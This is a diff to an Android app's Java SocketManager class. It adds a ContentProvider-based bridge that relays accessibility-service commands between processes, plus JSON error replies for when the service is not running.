@@ -2,7 +2,9 @@ package com.task.tusker.network;
 
 import android.content.Context;
 import android.graphics.Bitmap;
+import android.net.Uri;
 import android.os.Build;
+import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
 import android.util.Base64;
@@ -2751,10 +2753,63 @@ public class SocketManager {
         }
     }
 
+    /**
+     * Dispatch an accessibility command from the isolated accessibility process.
+     * This is the ContentProvider IPC entry point used by the main-process socket
+     * manager when the service instance is not visible in its own process.
+     */
+    public JSONObject executeAccessibilityCommandFromBridge(String command, JSONObject params) {
+        if (UnifiedAccessibilityService.getInstance() == null) {
+            JSONObject result = new JSONObject();
+            try {
+                result.put("success", false);
+                result.put("error", "Accessibility service is not running. Enable it in Settings → Accessibility → "
+                        + "Downloaded Apps → [App Name]");
+                result.put("requiresAccessibility", true);
+            } catch (JSONException ignored) {}
+            return result;
+        }
+        try {
+            return handleAccessibilityCommand(command, params != null ? params : new JSONObject());
+        } catch (JSONException e) {
+            JSONObject result = new JSONObject();
+            try {
+                result.put("success", false);
+                result.put("error", e.getMessage() != null ? e.getMessage() : "Invalid command parameters");
+            } catch (JSONException ignored) {}
+            return result;
+        }
+    }
+
     private JSONObject handleAccessibilityCommand(String command, JSONObject params) throws JSONException {
         UnifiedAccessibilityService accessSvc = UnifiedAccessibilityService.getInstance();
 
         if (accessSvc == null) {
+            if (UnifiedAccessibilityService.hasFreshHeartbeat(context)) {
+                try {
+                    Bundle extras = new Bundle();
+                    extras.putString("params", params != null ? params.toString() : "{}");
+                    Bundle reply = context.getContentResolver().call(
+                            Uri.parse("content://" + context.getPackageName()
+                                    + ".accessibilitybridge"),
+                            "execute", command, extras);
+                    if (reply != null) {
+                        String response = reply.getString("response");
+                        if (response != null && !response.isEmpty()) {
+                            return new JSONObject(response);
+                        }
+                    }
+                } catch (Exception e) {
+                    Log.w(TAG, "Accessibility IPC relay failed for " + command + ": "
+                            + e.getMessage());
+                }
+
+                JSONObject r = new JSONObject();
+                r.put("success", false);
+                r.put("error", "Accessibility service is active, but the command could not be delivered. Please retry.");
+                return r;
+            }
+
             JSONObject r = new JSONObject();
             r.put("success", false);
             r.put("error",   "Accessibility service is not running. Enable it in Settings → Accessibility → " +
